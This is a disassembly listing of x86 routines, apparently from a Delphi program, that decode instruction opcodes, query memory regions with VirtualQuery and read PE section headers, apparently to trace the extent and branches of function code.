loc_408CFF:				; DATA XREF: CODE:00406678o
		mov	edi, [edx+eax*4+8]
		mov	[ebx+ecx*4+8], edi
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-28h]
		mov	eax, [eax+24h]
		call	sub_404564
		push	eax
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-28h]
		add	eax, 24h
		mov	ecx, 1
		mov	edx, off_40714C
		call	sub_404718
		add	esp, 4
		jmp	short loc_408DA0
; ---------------------------------------------------------------------------

loc_408D34:				; CODE XREF: sub_408888+441j
		inc	esi
		dec	edi
		jnz	loc_408CB6
		jmp	short loc_408DA0
; ---------------------------------------------------------------------------

loc_408D3E:				; CODE XREF: sub_408888+3Bj
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-28h]
		mov	eax, [eax+24h]
		call	sub_40455C
		mov	esi, eax
		lea	eax, [esi+1]
		push	eax
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-28h]
		add	eax, 24h
		mov	ecx, 1
		mov	edx, off_40714C
		call	sub_404718
		add	esp, 4
		lea	eax, [esi+esi*2]
		mov	edx, [ebp+arg_0]
		mov	edx, [edx-28h]
		mov	edx, [edx+24h]
		mov	cl, [ebx+5]
		mov	[edx+eax*4], cl
		mov	edx, [ebp+arg_0]
		mov	edx, [edx-28h]
		mov	edx, [edx+24h]
		mov	ecx, [ebx+1Ch]
		mov	[edx+eax*4+4], ecx
		mov	edx, [ebp+arg_0]
		mov	edx, [edx-28h]
		mov	edx, [edx+24h]
		mov	ecx, [ebx+20h]
		mov	[edx+eax*4+8], ecx

loc_408DA0:				; CODE XREF: sub_408888+2Bj
					; sub_408888+425j ...
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_408DC5

loc_408DAD:				; CODE XREF: sub_408888+53Bj
		lea	eax, [ebp+var_58]
		call	sub_403994
		lea	eax, [ebp+var_C]
		call	sub_403994
		retn
; ---------------------------------------------------------------------------

loc_408DBE:				; DATA XREF: sub_408888+16o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_408DAD
; ---------------------------------------------------------------------------

loc_408DC5:				; CODE XREF: sub_408888+535j
					; DATA XREF: sub_408888+520o
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_408888	endp


; =============== S U B	R O U T	I N E =======================================


sub_408DCC	proc near		; CODE XREF: sub_408DD4+305p
		mov	eax, offset sub_4038A4
		retn
sub_408DCC	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_408DD4	proc near		; CODE XREF: sub_4092B0+2E0p
					; sub_4092B0+2FCp

var_58		= byte ptr -58h
var_34		= dword	ptr -34h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= byte ptr -0Ch
var_B		= byte ptr -0Bh
var_A		= byte ptr -0Ah
var_9		= byte ptr -9
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFA8h
		push	ebx
		push	esi
		push	edi
		mov	ebx, eax
		xor	eax, eax
		mov	[ebp+var_14], eax
		mov	[ebp+var_B], 0
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-2Ch]
		add	eax, eax
		lea	eax, [eax+eax*2]
		mov	edx, [ebp+arg_0]
		mov	edx, [edx-28h]
		mov	edx, [edx+1Ch]
		mov	edx, [edx+eax*8]
		mov	[ebp+var_8], edx
		mov	edx, [ebp+arg_0]
		mov	edx, [ebp+arg_0]
		mov	edx, [edx-28h]
		mov	edx, [edx+1Ch]
		lea	eax, [edx+eax*8+10h]
		mov	edx, [ebp+arg_0]
		add	edx, 0FFFFFFE0h
		mov	ecx, 20h
		call	sub_402664
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-38h]
		mov	[ebp+var_10], eax
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-28h]
		mov	eax, [eax+1Ch]
		call	sub_404564
		mov	esi, eax
		test	esi, esi
		jl	short loc_408E8E
		inc	esi
		mov	[ebp+var_4], 0

loc_408E47:				; CODE XREF: sub_408DD4+B8j
		mov	eax, [ebp+var_4]
		add	eax, eax
		lea	eax, [eax+eax*2]
		mov	edx, [ebp+arg_0]
		mov	edx, [edx-28h]
		mov	edx, [edx+1Ch]
		mov	eax, [edx+eax*8]
		mov	edx, [ebp+arg_0]
		mov	edx, [edx-2Ch]
		add	edx, edx
		lea	edx, [edx+edx*2]
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx-28h]
		mov	ecx, [ecx+1Ch]
		cmp	eax, [ecx+edx*8]
		jbe	short loc_408E88
		mov	edx, [ebp+arg_0]
		mov	edx, [edx-28h]
		cmp	eax, [ebp+var_10]
		jnb	short loc_408E88
		mov	edx, [ebp+arg_0]
		mov	edx, [edx-28h]
		mov	[ebp+var_10], eax

loc_408E88:				; CODE XREF: sub_408DD4+9Ej
					; sub_408DD4+A9j
		inc	[ebp+var_4]
		dec	esi
		jnz	short loc_408E47

loc_408E8E:				; CODE XREF: sub_408DD4+69j
					; sub_408DD4+3D1j
		mov	eax, [ebp+arg_0]
		lea	esi, [eax-20h]
		lea	edi, [ebp+var_34]
		mov	ecx, 8
		rep movsd
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-3Ch]
		push	eax
		lea	eax, [ebp+var_58]
		push	eax
		mov	eax, [ebp+arg_0]
		lea	edx, [eax-20h]
		xor	ecx, ecx
		mov	eax, [ebp+var_8]
		call	sub_40858C
		lea	esi, [ebp+var_58]
		mov	edi, ebx
		mov	ecx, 9
		rep movsd
		cmp	byte ptr [ebx],	0
		jz	loc_4091BA
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-2Ch]
		add	eax, eax
		lea	eax, [eax+eax*2]
		mov	edx, [ebp+arg_0]
		mov	edx, [edx-28h]
		mov	edx, [edx+1Ch]
		mov	ecx, [ebx+20h]
		dec	ecx
		mov	[edx+eax*8+4], ecx
		mov	ax, [ebx+2]
		add	eax, 0FFFFFF3Eh
		sub	ax, 2
		jb	loc_4091BA
		add	eax, 0FFFFFFFAh
		sub	ax, 2
		jb	loc_4091BA
		sub	ax, 3
		jz	loc_4091BA
		cmp	word ptr [ebx+2], 68h
		jnz	short loc_408F39
		mov	eax, [ebx+20h]
		sub	eax, [ebx+1Ch]
		cmp	eax, 5
		jnz	short loc_408F39
		mov	eax, [ebx+20h]
		cmp	byte ptr [eax],	64h
		jnz	short loc_408F39
		mov	eax, [ebx+1Ch]
		inc	eax
		mov	eax, [eax]
		mov	[ebp+var_14], eax
		jmp	short loc_408F9D
; ---------------------------------------------------------------------------

loc_408F39:				; CODE XREF: sub_408DD4+145j
					; sub_408DD4+150j ...
		cmp	[ebp+var_14], 0
		jz	short loc_408F9D
		cmp	word ptr [ebx+2], 0FFh
		jnz	short loc_408F98
		mov	al, [ebx+4]
		mov	edx, eax
		and	dl, 0F8h
		cmp	dl, 30h
		jnz	short loc_408F6D
		mov	edx, [ebx+20h]
		sub	edx, [ebx+1Ch]
		cmp	edx, 3
		jnz	short loc_408F6D
		and	al, 7
		and	eax, 0FFh
		cmp	[ebp+eax*4+var_34], 0
		jz	short loc_408F89

loc_408F6D:				; CODE XREF: sub_408DD4+17Ej
					; sub_408DD4+189j
		cmp	byte ptr [ebx+4], 35h
		jnz	short loc_408F98
		mov	eax, [ebx+20h]
		sub	eax, [ebx+1Ch]
		cmp	eax, 7
		jnz	short loc_408F98
		mov	eax, [ebx+1Ch]
		add	eax, 3
		cmp	dword ptr [eax], 0
		jnz	short loc_408F98

loc_408F89:				; CODE XREF: sub_408DD4+197j
		mov	eax, [ebp+arg_0]
		push	eax
		xor	edx, edx
		mov	eax, [ebp+var_14]
		call	sub_408628
		pop	ecx

loc_408F98:				; CODE XREF: sub_408DD4+171j
					; sub_408DD4+19Dj ...
		xor	eax, eax
		mov	[ebp+var_14], eax

loc_408F9D:				; CODE XREF: sub_408DD4+163j
					; sub_408DD4+169j
		cmp	[ebp+var_B], 0
		jnz	short loc_408FD8
		cmp	word ptr [ebx+2], 83h
		jnz	loc_4090D2
		mov	al, [ebx+4]
		add	al, 8
		sub	al, 8
		jnb	loc_4090D2
		mov	eax, [ebp+var_8]
		add	eax, 2
		mov	al, [eax]
		mov	[ebp+var_B], al
		mov	al, [ebx+4]
		and	al, 7
		mov	[ebp+var_A], al
		mov	[ebp+var_9], 0
		jmp	loc_4090D2
; ---------------------------------------------------------------------------

loc_408FD8:				; CODE XREF: sub_408DD4+1CDj
		cmp	[ebp+var_9], 0
		jnz	short loc_409038
		mov	ax, [ebx+2]
		mov	edx, eax
		sub	dx, 77h
		jz	short loc_408FFC
		sub	dx, 8
		jz	short loc_408FFC
		cmp	ax, 0F87h
		jz	short loc_408FFC
		cmp	ax, 0F8Fh
		jnz	short loc_409008

loc_408FFC:				; CODE XREF: sub_408DD4+214j
					; sub_408DD4+21Aj ...
		mov	[ebp+var_9], 1
		inc	[ebp+var_B]
		jmp	loc_4090D2
; ---------------------------------------------------------------------------

loc_409008:				; CODE XREF: sub_408DD4+226j
		mov	ax, [ebx+2]
		mov	edx, eax
		sub	dx, 73h
		jz	short loc_409026
		sub	dx, 0Ah
		jz	short loc_409026
		cmp	ax, 0F83h
		jz	short loc_409026
		cmp	ax, 0F8Dh
		jnz	short loc_40902F

loc_409026:				; CODE XREF: sub_408DD4+23Ej
					; sub_408DD4+244j ...
		mov	[ebp+var_9], 1
		jmp	loc_4090D2
; ---------------------------------------------------------------------------

loc_40902F:				; CODE XREF: sub_408DD4+250j
		mov	[ebp+var_B], 0
		jmp	loc_4090D2
; ---------------------------------------------------------------------------

loc_409038:				; CODE XREF: sub_408DD4+208j
		cmp	word ptr [ebx+2], 0FFh
		jnz	loc_4090CE
		cmp	byte ptr [ebx+4], 24h
		jnz	loc_4090CE
		mov	eax, [ebp+var_8]
		add	eax, 2
		mov	al, [eax]
		and	al, 0C7h
		cmp	al, 85h
		jnz	short loc_4090CE
		mov	eax, [ebp+var_8]
		add	eax, 2
		movzx	eax, byte ptr [eax]
		shr	eax, 3
		and	eax, 7
		xor	edx, edx
		mov	dl, [ebp+var_A]
		cmp	eax, edx
		jnz	short loc_4090CE
		mov	eax, [ebp+var_8]
		add	eax, 3
		mov	eax, [eax]
		cmp	eax, [ebx+20h]
		jnz	short loc_4090CE
		movzx	esi, [ebp+var_B]
		dec	esi
		test	esi, esi
		jl	short loc_4090AE
		inc	esi
		mov	[ebp+var_4], 0

loc_409092:				; CODE XREF: sub_408DD4+2D8j
		mov	eax, [ebp+arg_0]
		push	eax
		mov	eax, [ebx+20h]
		mov	edx, [ebp+var_4]
		mov	eax, [eax+edx*4]
		mov	edx, [ebp+var_8]
		call	sub_408628
		pop	ecx
		inc	[ebp+var_4]
		dec	esi
		jnz	short loc_409092

loc_4090AE:				; CODE XREF: sub_408DD4+2B4j
		mov	eax, [ebp+arg_0]
		push	eax
		push	0
		xor	eax, eax
		mov	al, [ebp+var_B]
		mov	edx, eax
		shl	edx, 2
		mov	eax, [ebx+20h]
		mov	cl, 1
		call	sub_4087C4
		pop	ecx
		jmp	loc_4091BA
; ---------------------------------------------------------------------------

loc_4090CE:				; CODE XREF: sub_408DD4+26Aj
					; sub_408DD4+274j ...
		mov	[ebp+var_B], 0

loc_4090D2:				; CODE XREF: sub_408DD4+1D5j
					; sub_408DD4+1E2j ...
		mov	esi, [ebx+8]
		test	esi, esi
		jz	short loc_4090E2
		call	sub_408DCC
		cmp	esi, eax
		jz	short loc_4090E6

loc_4090E2:				; CODE XREF: sub_408DD4+303j
		xor	eax, eax
		jmp	short loc_4090E8
; ---------------------------------------------------------------------------

loc_4090E6:				; CODE XREF: sub_408DD4+30Cj
		mov	al, 1

loc_4090E8:				; CODE XREF: sub_408DD4+310j
		mov	[ebp+var_C], al
		mov	eax, [ebp+arg_0]
		push	eax
		mov	eax, ebx
		call	sub_408888
		pop	ecx
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-24h]
		add	eax, eax
		lea	eax, [eax+eax*2]
		mov	edx, [ebp+arg_0]
		mov	edx, [edx-28h]
		mov	edx, [edx+1Ch]
		mov	eax, [edx+eax*8-30h]
		mov	edx, [ebp+arg_0]
		mov	edx, [edx-2Ch]
		add	edx, edx
		lea	edx, [edx+edx*2]
		mov	ecx, [ebp+arg_0]
		mov	ecx, [ecx-28h]
		mov	ecx, [ecx+1Ch]
		cmp	eax, [ecx+edx*8]
		jbe	short loc_409142
		mov	edx, [ebp+arg_0]
		mov	edx, [edx-28h]
		mov	edx, [ebp+arg_0]
		cmp	eax, [ebp+var_10]
		jnb	short loc_409142
		mov	edx, [ebp+arg_0]
		mov	edx, [edx-28h]
		mov	edx, [ebp+arg_0]
		mov	[ebp+var_10], eax

loc_409142:				; CODE XREF: sub_408DD4+352j
					; sub_408DD4+360j
		mov	ax, [ebx+2]
		add	eax, 0FFFFFF17h
		sub	ax, 3
		jb	short loc_4091BA
		cmp	word ptr [ebx+2], 0FFh
		jnz	short loc_409162
		mov	al, [ebx+4]
		and	al, 30h
		cmp	al, 20h
		jz	short loc_4091BA

loc_409162:				; CODE XREF: sub_408DD4+383j
		cmp	[ebp+var_C], 0
		jnz	short loc_4091BA
		mov	eax, [ebx+20h]
		mov	[ebp+var_8], eax
		mov	[ebp+var_C], 0
		mov	[ebp+var_4], 8
		mov	eax, [ebp+arg_0]
		add	eax, 0FFFFFFE0h
		lea	edx, [ebp+var_34]

loc_409182:				; CODE XREF: sub_408DD4+3C3j
		mov	ecx, [edx]
		cmp	ecx, [eax]
		jz	short loc_40918E
		mov	[ebp+var_C], 1
		jmp	short loc_409199
; ---------------------------------------------------------------------------

loc_40918E:				; CODE XREF: sub_408DD4+3B2j
		add	edx, 4
		add	eax, 4
		dec	[ebp+var_4]
		jnz	short loc_409182

loc_409199:				; CODE XREF: sub_408DD4+3B8j
		cmp	[ebp+var_C], 0
		jnz	short loc_4091AB
		mov	eax, [ebp+var_8]
		cmp	eax, [ebp+var_10]
		jb	loc_408E8E

loc_4091AB:				; CODE XREF: sub_408DD4+3C9j
		mov	eax, [ebp+arg_0]
		push	eax
		xor	edx, edx
		mov	eax, [ebp+var_8]
		call	sub_408628
		pop	ecx

loc_4091BA:				; CODE XREF: sub_408DD4+F4j
					; sub_408DD4+123j ...
		mov	eax, [ebp+var_8]
		cmp	eax, [ebp+var_10]
		jbe	short loc_4091C5
		mov	byte ptr [ebx],	0

loc_4091C5:				; CODE XREF: sub_408DD4+3ECj
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_408DD4	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4091CC	proc near		; CODE XREF: sub_4092B0+28Fp
					; sub_4092B0+367p

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ebx
		push	esi
		push	edi
		mov	edx, [ebp+arg_0]
		mov	edx, [edx-28h]
		mov	dword ptr [edx+8], 0FFFFFFFFh
		xor	edx, edx
		mov	[eax], edx
		mov	edx, [ebp+arg_0]
		mov	esi, [edx-24h]
		dec	esi
		test	esi, esi
		jl	short loc_409248
		inc	esi
		xor	edx, edx

loc_4091F1:				; CODE XREF: sub_4091CC+7Aj
		mov	ecx, edx
		add	ecx, ecx
		lea	ecx, [ecx+ecx*2]
		mov	ebx, [ebp+arg_0]
		mov	ebx, [ebx-28h]
		mov	ebx, [ebx+1Ch]
		mov	ebx, [ebx+ecx*8]
		mov	edi, [ebp+arg_0]
		mov	edi, [edi-28h]
		cmp	ebx, [edi+8]
		jnb	short loc_409224
		mov	ebx, [ebp+arg_0]
		mov	ebx, [ebx-28h]
		mov	ebx, [ebx+1Ch]
		mov	ebx, [ebx+ecx*8]
		mov	edi, [ebp+arg_0]
		mov	edi, [edi-28h]
		mov	[edi+8], ebx

loc_409224:				; CODE XREF: sub_4091CC+41j
		mov	ebx, [ebp+arg_0]
		mov	ebx, [ebx-28h]
		mov	ebx, [ebx+1Ch]
		mov	ebx, [ebx+ecx*8+4]
		cmp	ebx, [eax]
		jbe	short loc_409244
		mov	ebx, [ebp+arg_0]
		mov	ebx, [ebx-28h]
		mov	ebx, [ebx+1Ch]
		mov	ecx, [ebx+ecx*8+4]
		mov	[eax], ecx

loc_409244:				; CODE XREF: sub_4091CC+67j
		inc	edx
		dec	esi
		jnz	short loc_4091F1

loc_409248:				; CODE XREF: sub_4091CC+20j
		mov	eax, [eax]
		mov	edx, [ebp+arg_0]
		mov	edx, [edx-28h]
		sub	eax, [edx+8]
		inc	eax
		mov	edx, [ebp+arg_0]
		mov	edx, [edx-28h]
		mov	[edx+0Ch], eax
		pop	edi
		pop	esi
		pop	ebx
		pop	ebp
		retn
sub_4091CC	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_409264	proc near		; CODE XREF: sub_409264+3Ap
					; sub_4092B0+296p

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ebx
		push	esi
		mov	esi, [ebp+arg_0]
		mov	esi, [esi-28h]
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-24h]
		dec	eax
		test	eax, eax
		jl	short loc_4092AA
		inc	eax
		xor	ebx, ebx

loc_40927D:				; CODE XREF: sub_409264+44j
		mov	edx, ebx
		add	edx, edx
		lea	edx, [edx+edx*2]
		mov	ecx, [esi+1Ch]
		mov	ecx, [ecx+edx*8]
		cmp	ecx, [esi+8]
		jnz	short loc_4092A6
		mov	eax, [esi+1Ch]
		mov	eax, [eax+edx*8+4]
		inc	eax
		mov	[esi+8], eax
		mov	eax, [ebp+arg_0]
		push	eax
		call	sub_409264
		pop	ecx
		jmp	short loc_4092AA
; ---------------------------------------------------------------------------

loc_4092A6:				; CODE XREF: sub_409264+29j
		inc	ebx
		dec	eax
		jnz	short loc_40927D

loc_4092AA:				; CODE XREF: sub_409264+14j
					; sub_409264+40j
		pop	esi
		pop	ebx
		pop	ebp
		retn
sub_409264	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4092B0	proc near		; CODE XREF: sub_4097C0+Cp

var_B0		= dword	ptr -0B0h
var_AC		= byte ptr -0ACh
Buffer		= _MEMORY_BASIC_INFORMATION ptr	-88h
var_6C		= byte ptr -6Ch
var_67		= byte ptr -67h
var_66		= byte ptr -66h
var_64		= dword	ptr -64h
var_60		= dword	ptr -60h
var_5C		= dword	ptr -5Ch
var_58		= dword	ptr -58h
var_54		= byte ptr -54h
var_4C		= dword	ptr -4Ch
var_45		= byte ptr -45h
var_44		= dword	ptr -44h
var_40		= dword	ptr -40h
var_3C		= dword	ptr -3Ch
var_38		= dword	ptr -38h
var_34		= dword	ptr -34h
lpAddress	= dword	ptr -30h
var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
var_24		= dword	ptr -24h
var_20		= byte ptr -20h

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFF50h
		push	ebx
		push	esi
		push	edi
		xor	ebx, ebx
		mov	[ebp+var_B0], ebx
		mov	[ebp+var_28], ecx
		mov	[ebp+var_3C], edx
		mov	[ebp+lpAddress], eax
		xor	eax, eax
		push	ebp
		push	offset loc_409798
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		mov	eax, [ebp+var_28]
		mov	edx, off_407188
		call	sub_4041D4
		mov	eax, [ebp+var_28]
		mov	edx, 40h
		call	sub_405424
		push	1Ch		; dwLength
		lea	eax, [ebp+Buffer]
		push	eax		; lpBuffer
		mov	eax, [ebp+lpAddress]
		push	eax		; lpAddress
		call	VirtualQuery
		cmp	eax, 1Ch
		jnz	loc_409744
		cmp	[ebp+Buffer.State], 1000h
		jnz	loc_409744
		mov	eax, [ebp+Buffer.AllocationBase]
		call	sub_4067D4
		mov	edx, eax
		test	edx, edx
		jz	short loc_409396
		lea	eax, [edx+18h]
		mov	esi, edx
		add	esi, 0F8h
		mov	ecx, esi
		test	byte ptr [ecx+24h], 20h
		jz	short loc_40935A
		mov	edx, [ecx+0Ch]
		add	edx, [ebp+Buffer.AllocationBase]
		mov	[ebp+var_34], edx
		mov	edx, [ecx+8]
		add	edx, [ebp+var_34]
		dec	edx
		mov	[ebp+var_38], edx
		jmp	short loc_409370
; ---------------------------------------------------------------------------

loc_40935A:				; CODE XREF: sub_4092B0+90j
		mov	edx, [eax+14h]
		add	edx, [ebp+Buffer.AllocationBase]
		mov	[ebp+var_34], edx
		mov	edx, [eax+4]
		add	edx, [ebp+var_34]
		dec	edx
		mov	[ebp+var_38], edx

loc_409370:				; CODE XREF: sub_4092B0+A8j
		mov	edx, [eax+18h]
		add	edx, [ebp+Buffer.AllocationBase]
		mov	ecx, [eax+0Ch]
		add	ecx, edx
		add	ecx, [eax+8]
		dec	ecx
		mov	eax, ecx
		cmp	edx, [ebp+var_34]
		jnb	short loc_40938C
		mov	[ebp+var_34], edx

loc_40938C:				; CODE XREF: sub_4092B0+D7j
		cmp	eax, [ebp+var_38]
		jbe	short loc_4093A8
		mov	[ebp+var_38], eax
		jmp	short loc_4093A8
; ---------------------------------------------------------------------------

loc_409396:				; CODE XREF: sub_4092B0+7Dj
		mov	eax, [ebp+Buffer.BaseAddress]
		mov	[ebp+var_34], eax
		mov	eax, [ebp+var_34]
		add	eax, [ebp+Buffer.RegionSize]
		mov	[ebp+var_38], eax

loc_4093A8:				; CODE XREF: sub_4092B0+DFj
					; sub_4092B0+E4j
		mov	eax, [ebp+var_28]
		mov	edx, [ebp+lpAddress]
		mov	[eax+4], edx
		mov	eax, [ebp+var_28]
		mov	byte ptr [eax+28h], 0
		mov	eax, [ebp+var_28]
		mov	byte ptr [eax+2Ch], 1
		xor	eax, eax
		mov	[ebp+var_24], eax
		lea	eax, [ebp+var_20]
		mov	edx, 20h
		call	sub_405424
		push	ebp
		mov	eax, [ebp+var_28]
		mov	eax, [eax+4]
		xor	edx, edx
		call	sub_408628
		pop	ecx

loc_4093E0:				; CODE XREF: sub_4092B0+2EAj
					; sub_4092B0+306j
		mov	[ebp+var_2C], 0FFFFFFFFh
		mov	eax, [ebp+var_24]
		dec	eax
		test	eax, eax
		jl	short loc_40940F
		inc	eax
		xor	ebx, ebx

loc_4093F2:				; CODE XREF: sub_4092B0+15Dj
		mov	edx, ebx
		add	edx, edx
		lea	edx, [edx+edx*2]
		mov	ecx, [ebp+var_28]
		mov	ecx, [ecx+1Ch]
		cmp	dword ptr [ecx+edx*8+4], 0
		jnz	short loc_40940B
		mov	[ebp+var_2C], ebx
		jmp	short loc_40940F
; ---------------------------------------------------------------------------

loc_40940B:				; CODE XREF: sub_4092B0+154j
		inc	ebx
		dec	eax
		jnz	short loc_4093F2

loc_40940F:				; CODE XREF: sub_4092B0+13Dj
					; sub_4092B0+159j
		cmp	[ebp+var_2C], 0FFFFFFFFh
		jnz	loc_4094F8
		mov	eax, [ebp+var_28]
		mov	eax, [eax+24h]
		call	sub_404564
		mov	ebx, eax
		cmp	ebx, 0
		jl	loc_4094F8

loc_40942F:				; CODE XREF: sub_4092B0+242j
		mov	[ebp+var_45], 0
		mov	eax, [ebp+var_24]
		dec	eax
		test	eax, eax
		jl	loc_4094E8
		inc	eax
		xor	esi, esi

loc_409442:				; CODE XREF: sub_4092B0+232j
		lea	edx, [ebx+ebx*2]
		mov	ecx, [ebp+var_28]
		mov	ecx, [ecx+24h]
		mov	edx, [ecx+edx*4+4]
		mov	ecx, esi
		add	ecx, ecx
		lea	ecx, [ecx+ecx*2]
		mov	edi, [ebp+var_28]
		mov	edi, [edi+1Ch]
		cmp	edx, [edi+ecx*8]
		jb	short loc_4094E0
		lea	edx, [ebx+ebx*2]
		mov	ecx, [ebp+var_28]
		mov	ecx, [ecx+24h]
		mov	edx, [ecx+edx*4+8]
		mov	ecx, esi
		add	ecx, ecx
		lea	ecx, [ecx+ecx*2]
		mov	edi, [ebp+var_28]
		mov	edi, [edi+1Ch]
		cmp	edx, [edi+ecx*8+4]
		ja	short loc_4094E0
		mov	eax, [ebp+var_3C]
		push	eax
		lea	eax, [ebp+var_6C]
		push	eax
		mov	eax, esi
		add	eax, eax
		lea	eax, [eax+eax*2]
		mov	edx, [ebp+var_28]
		mov	edx, [edx+1Ch]
		lea	edx, [edx+eax*8+10h]
		lea	eax, [ebx+ebx*2]
		mov	ecx, [ebp+var_28]
		mov	ecx, [ecx+24h]
		mov	eax, [ecx+eax*4+4]
		mov	cl, 1
		call	sub_40858C
		cmp	[ebp+var_64], 0
		jz	short loc_4094E8
		push	ebp
		lea	eax, [ebp+var_6C]
		call	sub_408888
		pop	ecx
		mov	eax, [ebp+var_24]
		add	eax, eax
		lea	eax, [eax+eax*2]
		mov	edx, [ebp+var_28]
		mov	edx, [edx+1Ch]
		cmp	dword ptr [edx+eax*8-2Ch], 0
		jnz	short loc_4094E8
		mov	eax, [ebp+var_24]
		dec	eax
		mov	[ebp+var_2C], eax
		mov	[ebp+var_45], 1
		jmp	short loc_4094E8
; ---------------------------------------------------------------------------

loc_4094E0:				; CODE XREF: sub_4092B0+1AFj
					; sub_4092B0+1CFj
		inc	esi
		dec	eax
		jnz	loc_409442

loc_4094E8:				; CODE XREF: sub_4092B0+189j
					; sub_4092B0+202j ...
		cmp	[ebp+var_45], 0
		jnz	short loc_4094F8
		dec	ebx
		cmp	ebx, 0FFFFFFFFh
		jnz	loc_40942F

loc_4094F8:				; CODE XREF: sub_4092B0+163j
					; sub_4092B0+179j ...
		cmp	[ebp+var_2C], 0FFFFFFFFh
		jnz	loc_4095A8
		mov	[ebp+var_45], 0
		mov	eax, [ebp+var_28]
		mov	eax, [eax+24h]
		call	sub_404564
		test	eax, eax
		jl	short loc_409531
		inc	eax
		xor	ebx, ebx

loc_409518:				; CODE XREF: sub_4092B0+27Fj
		lea	edx, [ebx+ebx*2]
		mov	ecx, [ebp+var_28]
		mov	ecx, [ecx+24h]
		cmp	byte ptr [ecx+edx*4], 0
		jnz	short loc_40952D
		mov	[ebp+var_45], 1
		jmp	short loc_409531
; ---------------------------------------------------------------------------

loc_40952D:				; CODE XREF: sub_4092B0+275j
		inc	ebx
		dec	eax
		jnz	short loc_409518

loc_409531:				; CODE XREF: sub_4092B0+263j
					; sub_4092B0+27Bj
		cmp	[ebp+var_45], 0
		jz	loc_4095BC
		push	ebp
		lea	eax, [ebp+var_40]
		call	sub_4091CC
		pop	ecx
		push	ebp
		call	sub_409264
		pop	ecx
		mov	eax, [ebp+var_28]
		mov	eax, [eax+8]
		mov	edx, eax
		dec	edx
		cmp	edx, [ebp+var_40]
		jz	short loc_4095BC
		mov	edx, [ebp+var_28]
		mov	edx, [ebp+var_40]
		sub	edx, eax
		cmp	edx, 400h
		jnb	short loc_4095BC
		mov	eax, [ebp+var_24]
		mov	[ebp+var_2C], eax
		lea	eax, [ebp+var_20]
		mov	edx, 20h
		call	sub_405424
		push	ebp
		mov	eax, [ebp+var_28]
		mov	eax, [eax+8]
		xor	edx, edx
		call	sub_408628
		pop	ecx
		push	ebp
		lea	eax, [ebp+var_6C]
		call	sub_408DD4
		pop	ecx
		cmp	[ebp+var_6C], 0
		jnz	loc_4093E0
		mov	eax, [ebp+var_2C]
		mov	[ebp+var_24], eax
		jmp	short loc_4095BC
; ---------------------------------------------------------------------------

loc_4095A8:				; CODE XREF: sub_4092B0+24Cj
		push	ebp
		lea	eax, [ebp+var_6C]
		call	sub_408DD4
		pop	ecx
		cmp	[ebp+var_6C], 0
		jnz	loc_4093E0

loc_4095BC:				; CODE XREF: sub_4092B0+285j
					; sub_4092B0+2A8j ...
		mov	eax, [ebp+var_24]
		push	eax
		mov	eax, [ebp+var_28]
		add	eax, 1Ch
		mov	ecx, 1
		mov	edx, off_407104
		call	sub_404718
		add	esp, 4
		cmp	[ebp+var_6C], 0
		jnz	short loc_40960D
		mov	eax, [ebp+var_28]
		mov	byte ptr [eax],	0
		mov	eax, [ebp+var_28]
		mov	edx, [ebp+var_4C]
		mov	[eax+10h], edx
		mov	eax, [ebp+var_28]
		mov	dword ptr [eax+14h], 770001h
		mov	eax, [ebp+var_28]
		add	eax, 18h
		mov	edx, offset dword_4097B0
		call	sub_4039E8
		jmp	loc_40977F
; ---------------------------------------------------------------------------

loc_40960D:				; CODE XREF: sub_4092B0+32Dj
		mov	eax, [ebp+var_28]
		mov	byte ptr [eax],	1
		push	ebp
		lea	eax, [ebp+var_40]
		call	sub_4091CC
		pop	ecx
		mov	eax, [ebp+var_28]
		mov	eax, [eax+0Ch]
		add	eax, 4
		mov	edx, [ebp+var_28]
		add	[edx+30h], eax
		xor	ebx, ebx
		xor	esi, esi

loc_409630:				; CODE XREF: sub_4092B0+41Aj
		mov	[ebp+var_45], 1
		mov	eax, ebx
		add	eax, eax
		lea	eax, [eax+eax*2]
		mov	edx, [ebp+var_28]
		mov	edx, [edx+1Ch]
		cmp	byte ptr [edx+eax*8+8],	0
		jnz	loc_4096D0
		mov	edx, [ebp+var_28]
		mov	edx, [edx+1Ch]
		cmp	byte ptr [edx+eax*8+9],	0
		jnz	short loc_4096D0
		mov	edx, [ebp+var_28]
		mov	edx, [edx+1Ch]
		cmp	dword ptr [edx+eax*8+0Ch], 0
		jnz	short loc_4096D0
		mov	eax, [ebp+var_28]
		mov	eax, [eax+1Ch]
		mov	eax, [eax+4]
		mov	edx, [ebp+var_28]
		mov	edx, [edx+1Ch]
		sub	eax, [edx]
		inc	eax
		add	esi, eax
		mov	eax, [ebp+var_28]
		mov	eax, [eax+1Ch]
		call	sub_404564
		test	eax, eax
		jle	short loc_4096C6
		mov	[ebp+var_44], 1

